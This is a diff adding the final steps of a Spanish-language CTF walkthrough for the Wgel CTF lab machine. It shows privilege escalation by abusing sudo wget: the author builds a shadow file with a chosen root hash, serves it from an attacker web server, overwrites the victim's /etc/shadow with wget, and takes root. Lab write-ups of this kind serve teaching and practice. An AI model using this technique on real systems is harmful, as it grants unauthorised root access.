@@ -277,10 +277,49 @@ Encontramos un articulo donde podemos abusar del comando wget para escalar privi
         └─# openssl passwd -6 -salt 1234 esevka 
         $6$1234$g1lWhEG.uAVQXEMduV0nyGCd2D3LlPeru53Iln.V18hdvHu53MU7PbZ48pEdBQAgrms1tCN7ccWH8APR2aOvo.
        
+3)Modificamos el fichero shadow que nos descargamos y le metemos la clave que hemos creado
 
-   
+    root:$6$1234$g1lWhEG.uAVQXEMduV0nyGCd2D3LlPeru53Iln.V18hdvHu53MU7PbZ48pEdBQAgrms1tCN7ccWH8APR2aOvo.:18195:0:99999:7:::
+    daemon:*:17953:0:99999:7:::
+    bin:*:17953:0:99999:7:::
+    sys:*:17953:0:99999:7:::
+
+4)Sobreescribimos el fichero shadow de la maquina victima con el nuestro que tiene la clave de root modificada.
+
+Montamos un servidor web para compartir nuestro fichero shadow
+
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
+        └─# python -m http.server 80
+        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+        10.9.92.151 - - [02/Aug/2023 11:45:59] "GET / HTTP/1.1" 200 -
+
+Nos descargamos y sobreescribimos el fichero shadow en la maquina victima con wget.
+
+    jessie@CorpOne:~$ sudo /usr/bin/wget http://10.9.92.151/shadow -O /etc/shadow
+    --2023-08-02 12:47:05--  http://10.9.92.151/shadow
+    Connecting to 10.9.92.151:80... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 1366 (1,3K) [application/octet-stream]
+    Saving to: ‘/etc/shadow’
+    
+    /etc/shadow                                     100%[=======================================================================================================>]   1,33K  --.-KB/s    in 0s      
+    
+    2023-08-02 12:47:05 (107 MB/s) - ‘/etc/shadow’ saved [1366/1366]
+
+5)Cambiamos a root y mostramos la flag
+
+    jessie@CorpOne:~$ su root
+    Password:  ===========> ponemos nuestra clave
+
+    root@CorpOne:/home/jessie# cat /root/root_flag.txt 
+    b1b968b37519a....408188649263d
 
 
+
+---
+---> Maquina Wgel CTF completa. <---
+---
+---
 
 
 
